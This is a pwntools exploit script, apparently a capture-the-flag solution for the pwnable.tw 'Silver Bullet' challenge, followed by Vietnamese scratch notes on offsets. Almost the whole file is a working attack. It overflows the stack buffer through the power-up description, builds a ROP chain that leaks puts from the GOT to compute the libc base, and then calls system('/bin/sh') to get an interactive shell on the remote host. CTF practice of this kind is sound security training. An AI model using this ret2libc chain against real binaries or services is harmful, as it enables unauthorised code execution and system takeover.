#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3

from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10103

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)

    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)


# OFFSET & VARIABLES

# FUNCTIONS
def create_bullet(p, des):
    p.sendlineafter(b"Your choice :", B(1))
    p.sendafter(b"Give me your description of bullet :", B(des))

def power_up(p, des):
    p.sendlineafter(b"Your choice :", B(2))
    p.sendafter(b"Give me your another description of bullet :", B(des))    

def beat(p):
    p.sendlineafter(b"Your choice :", B(3))

# MAIN
def main():
    p = connect()
    
    # print(hex(libc.symbols["__libc_start_main"]))
    PUTS_GOT = e.got.puts
    PUTS_PLT = e.plt.puts

    BUFFER_START = 0xffffd2e4
    MAIN = 0x08048954
    BEAT = 0x8048733
    PAYLOAD = p32(PUTS_PLT) + p32(MAIN) + p32(PUTS_GOT)
    # PAYLOAD = b"AAAAAAAAAAAAAAA"

    create_bullet(p, "A" * 47)
    power_up(p, "A")
    power_up(p, b"\x7f\xff\xff" + b"AAAA" + PAYLOAD)

    beat(p)

    PUTS_OFFSET = libc.symbols["puts"]
    p.recvuntil(b"Oh ! You win !!\n")
    LEAK_PUTS_ADDRESS = u32(p.recv(4))
    libc.address = LEAK_PUTS_ADDRESS - PUTS_OFFSET

    BIN_SH = next(libc.search(b"/bin/sh\0"))
    SYSTEM = libc.symbols["system"]

    print(f"puts address -> {hex(LEAK_PUTS_ADDRESS)}")
    print(f"LIBC BASE -> {hex(libc.address)}")
    print(f"BIN SH -> {hex(BIN_SH)}")

    PAYLOAD = p32(SYSTEM) + p32(MAIN) + p32(BIN_SH)

    create_bullet(p, "A" * 47)
    power_up(p, "A")
    power_up(p, b"\x7f\xff\xff" + b"AAAA" + PAYLOAD)

    beat(p)    

    # GDB(p)

    p.interactive()


if __name__ == '__main__':
    main()

'''

0xffffd2e4: input

0x08048d06: "Gin"

-> Tìm cách nào để leak được libc sau đó truyền vào 0x08048d06 để xem sau đó dùng ROP Chain

guess libc base: 0xf7e1a000

0xffffd31c│+0x0000: 0xf7e32637

0xffffd2e4 - 0xffffd31c = 56

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: 47
                                               AAAAAA: 9 -> 56



rop chain:
    -> beat
    -> main
    -> puts.got
    -> 0xffffd2e4
'''